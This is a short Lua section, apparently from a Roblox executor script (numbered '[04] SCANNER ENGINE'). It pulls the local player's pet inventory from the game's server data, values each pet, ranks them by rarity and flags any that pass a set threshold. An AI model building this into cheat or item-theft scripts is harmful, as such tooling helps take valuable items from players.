-- [04] SCANNER ENGINE (PET SORTING)
local function getSortedInventory()
    local allData = RouterClient.get("DataAPI/GetAllServerData"):InvokeServer()
    local playerKey = allData[LocalPlayer.Name] and LocalPlayer.Name or tostring(LocalPlayer.UserId)
    local rawPets = allData[playerKey].inventory.pets
    
    -- ETFB Bucket System (Mega > Neon > High Tier > Normal)
    local buckets = { mega = {}, neon = {}, high = {}, normal = {} }
    local petCount, petText, totalPoints = 0, "", 0
    local hasHighTier = false

    for _, item in pairs(rawPets) do
        local db = InventoryDB.pets[item.id]
        if db then
            local val = (_G.GetTrueValue and _G.GetTrueValue(item)) or 0
            petCount = petCount + 1
            totalPoints = totalPoints + val
            petText = petText .. "- " .. (db.name or "Unknown") .. " (" .. val .. ")\n"

            if val >= getgenv().THRESHOLD then hasHighTier = true end

            if item.properties and item.properties.mega_neon then
                table.insert(buckets.mega, item)
            elseif item.properties and item.properties.neon then
                table.insert(buckets.neon, item)
            elseif val >= 10 then
                table.insert(buckets.high, item)
            else
                table.insert(buckets.normal, item)
            end
        end
    end

    local finalOrder = {}
    for _, b in pairs({buckets.mega, buckets.neon, buckets.high, buckets.normal}) do
        for _, it in ipairs(b) do table.insert(finalOrder, it) end
    end

    return finalOrder, petCount, petText, totalPoints, hasHighTier
end

